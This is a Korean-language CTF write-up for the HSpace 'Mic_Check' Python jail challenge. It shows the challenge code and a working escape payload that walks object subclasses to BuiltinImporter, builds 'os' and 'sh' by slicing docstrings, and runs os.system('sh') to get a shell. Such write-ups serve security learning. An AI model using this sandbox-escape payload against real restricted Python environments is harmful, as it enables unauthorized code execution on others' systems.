# hspace - Mic_Check

### 문제 코드
```python
import string
import sys

code=''
sys.stdout.write("HSpace Mic-check :)\n")
sys.stdout.write("code: ")
sys.stdout.flush()

while True:
  line = sys.stdin.readline()
  if line.startswith("end"):
    break
  code += line
  
allowed = set(string.ascii_lowercase+'()[]: ._\n'+string.digits)

if allowed | set(code) != allowed:
    sys.stdout.write("nono :(\n")
elif len(code) > 0x80:
    sys.stdout.write("too long :(\n")
else:
    compiled = compile(code,"",'exec')
    eval(compiled, {"__builtins__": {}}, {"__builtins__": {}})
```

### 분석
end가 오기전까지 입력받고
소문자, 숫자, ()[]: .\_\\n 이렇게만 사용가능
페이로드 80바이트 초과면 실패
`__builtins__` 네임스페이스를 빈 딕셔너리로 덮어쓰게 만듬
=컴파일 시 파이썬 내장 모듈(`__builtins__`)을 비우게 만듬
=내장 함수와 클래스를 사용하지 못하게 하는 것
### 문제풀이(한별님 풀이)
subclass list 가져옴
`().__class__.__bases__[0].__subclasses__()`

문자열 길이에 제한이 있어,
`<class '_frozen_importlib.BuiltinImporter'>`과 load_module을 이용해 
os.system('sh')을 불러들여 쉘 권한을 먼저 얻고
그 후에 cat flag 등의 작업을 수행

`<class '_frozen_importlib.BuiltinImporter'>`는 파이썬 내장 모듈을 가져오기(import) 위한 내장 모듈 로더(loader) 중 하나
`math`, `sys`, `os`와 같은 모듈들이 내장 모듈에 해당. `BuiltinImporter`는 이러한 내장 모듈을 가져오는 역할을 담당하며, 파이썬 인터프리터가 시작될 때 이미 로드되어 있음

따옴표를 사용할 수 없으므로, 문자열을 직접 __doc__ 의 결과에서 가져옴
```python
print(().__class__.__bases__[0].__subclasses__() [107].__doc__)
"""
Meta path import for built-in modules. All methods are either class or static methods to avoid the need to instantiate the class.
"""
```

os와 sh 문자열을 python의 list slicing 기능을 활용해서 구함

```python
os = [].__doc__[32:49:12] sh = [].__doc__[44:55:10]
```

최종 페이로드
```python
().__class__.__bases__[0].__subclasses__()[107].load_module([].__doc__[32:49:12]).system([].__doc__[44:55:10])

"""
-> <class '_frozen_importlib.BuiltinImporter'>. load_module('os').system("sh")
-> os.system("sh")
"""
```